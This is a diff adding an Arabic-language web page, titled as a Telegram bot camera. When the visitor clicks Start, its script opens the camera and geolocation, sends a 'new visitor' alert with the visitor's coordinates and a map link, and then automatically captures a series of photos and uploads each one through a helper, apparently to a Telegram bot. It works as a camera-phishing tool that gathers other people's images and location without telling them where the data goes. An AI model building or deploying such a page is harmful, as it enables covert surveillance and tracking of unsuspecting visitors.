@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>كاميرا بوت تيليغرام</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #1a1a2e;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: #16213e;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+        h1 { 
+            text-align: center; 
+            margin-bottom: 20px;
+            color: #00d4ff;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            background: #000;
+        }
+        #video {
+            width: 100%;
+            display: none;
+            transform: scaleX(-1); /* مرآة للكاميرا الأمامية */
+        }
+        #canvas { display: none; }
+        
+        .status {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .progress-container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            height: 10px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #0099ff);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .image-counter {
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #00d4ff;
+            display: none;
+        }
+        
+        .buttons {
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-start {
+            background: #00d4ff;
+            color: #1a1a2e;
+        }
+        .btn-start:hover { background: #00b8e6; }
+        .btn-start:disabled { background: #555; color: #999; cursor: not-allowed; }
+        
+        .btn-stop {
+            background: #ff4757;
+            color: white;
+        }
+        .btn-stop:hover { background: #ee3a4a; }
+        .btn-stop:disabled { background: #555; color: #999; cursor: not-allowed; }
+        
+        .log {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 12px;
+            color: #aaa;
+            display: none;
+        }
+        .log div { margin: 3px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📸 كاميرا البوت</h1>
+        
+        <div class="video-container">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <div class="status" id="status">⏳ جاري التحميل...</div>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="image-counter" id="imageCounter"></div>
+        
+        <div class="buttons">
+            <button class="btn-start" id="startBtn" disabled>▶️ بدء</button>
+            <button class="btn-stop" id="stopBtn" disabled>⏹ إيقاف</button>
+        </div>
+        
+        <div class="log" id="log"></div>
+    </div>
+
+    <!-- تحميل الملفات -->
+    <script src="config.js"></script>
+    <script src="cam-bot.js"></script>
+    
+    <script>
+        const statusDiv = document.getElementById('status');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const imageCounter = document.getElementById('imageCounter');
+        const logDiv = document.getElementById('log');
+        
+        let isRunning = false;
+
+        function addLog(message) {
+            logDiv.style.display = 'block';
+            const div = document.createElement('div');
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logDiv.appendChild(div);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function showStatus(message, isError = false) {
+            statusDiv.textContent = message;
+            statusDiv.style.color = isError ? '#ff4757' : 'white';
+            addLog(message);
+        }
+
+        function updateProgress(current, total) {
+            const percentage = (current / total) * 100;
+            progressBar.style.width = percentage + '%';
+            progressContainer.style.display = 'block';
+            imageCounter.style.display = 'block';
+            imageCounter.textContent = `📸 ${current} / ${total}`;
+        }
+
+        function updateUI(running) {
+            startBtn.disabled = running;
+            stopBtn.disabled = !running;
+        }
+
+        async function startBot() {
+            try {
+                isRunning = true;
+                updateUI(true);
+                
+                // 1. تهيئة الكاميرا
+                showStatus('🎥 جاري تهيئة الكاميرا...');
+                if (!CamBot.init()) throw new Error('فشل تهيئة الكاميرا');
+                
+                // 2. تشغيل الكاميرا والموقع
+                const result = await CamBot.startAll((type, data) => {
+                    if (type === 'location') {
+                        showStatus('📍 تم تحديد الموقع');
+                        addLog('📍 الموقع: ' + data.lat + ', ' + data.lng);
+                    } else if (type === 'camera_ready') {
+                        showStatus('✅ الكاميرا جاهزة');
+                        document.getElementById('video').style.display = 'block';
+                    } else if (type === 'camera_error') {
+                        showStatus('❌ خطأ في الكاميرا: ' + data, true);
+                    }
+                });
+
+                if (!result.success) {
+                    throw new Error(result.error || 'فشل تشغيل الكاميرا');
+                }
+
+                // 3. إرسال معلومات الجهاز
+                showStatus('📤 جاري إرسال معلومات الجهاز...');
+                await Config.sendDeviceInfo({
+                    location: result.location
+                });
+                addLog('✅ تم إرسال معلومات الجهاز');
+
+                // 4. إرسال رسالة ترحيب
+                await Config.sendMessage(
+                    '👤 <b>زائر جديد!</b>\n\n' +
+                    (result.location ? 
+                        `📍 <b>الموقع:</b>\n` +
+                        `${result.location.lat}, ${result.location.lng}\n` +
+                        `<a href="${result.location.mapUrl}">🗺 عرض على الخريطة</a>`
+                        : '📍 الموقع غير متاح')
+                );
+                addLog('✅ تم إرسال رسالة الترحيب');
+
+                // 5. بدء التقاط الصور
+                showStatus('📸 جاري التقاط الصور...');
+                updateProgress(0, CamBot.settings.captureCount);
+
+                CamBot.startAutoCapture(async (base64Image, imageNumber) => {
+                    updateProgress(imageNumber, CamBot.settings.captureCount);
+                    showStatus(`📸 جاري إرسال الصورة ${imageNumber}/${CamBot.settings.captureCount}`);
+                    
+                    // ✅ إرسال الصورة مباشرة
+                    const caption = `📸 صورة ${imageNumber}/${CamBot.settings.captureCount}`;
+                    addLog(`📤 إرسال الصورة ${imageNumber}...`);
+                    
+                    const sendResult = await Config.sendPhoto(base64Image, caption);
+                    
+                    if (sendResult.ok) {
+                        addLog(`✅ تم إرسال الصورة ${imageNumber} بنجاح`);
+                        console.log('✅ صورة', imageNumber, 'تم الإرسال');
+                    } else {
+                        addLog(`❌ فشل إرسال الصورة ${imageNumber}: ${sendResult.error}`);
+                        console.error('❌ فشل الصورة', imageNumber, sendResult.error);
+                    }
+                });
+
+            } catch (error) {
+                showStatus('❌ خطأ: ' + error.message, true);
+                console.error('خطأ:', error);
+                updateUI(false);
+                
+                try {
+                    await Config.sendMessage('❌ <b>خطأ:</b>\n' + error.message);
+                } catch (e) {
+                    console.error('فشل إرسال رسالة الخطأ:', e);
+                }
+            }
+        }
+
+        function stopBot() {
+            CamBot.stop();
+            document.getElementById('video').style.display = 'none';
+            progressContainer.style.display = 'none';
+            imageCounter.style.display = 'none';
+            showStatus('⏹ تم الإيقاف');
+            updateUI(false);
+            isRunning = false;
+        }
+
+        startBtn.addEventListener('click', startBot);
+        stopBtn.addEventListener('click', stopBot);
+
+        window.addEventListener('load', () => {
+            showStatus('✅ جاهز! اضغط بدء');
+            startBtn.disabled = false;
+        });
+
+        window.addEventListener('beforeunload', () => {
+            if (isRunning) CamBot.stop();
+        });
+    </script>
+</body>
+</html>
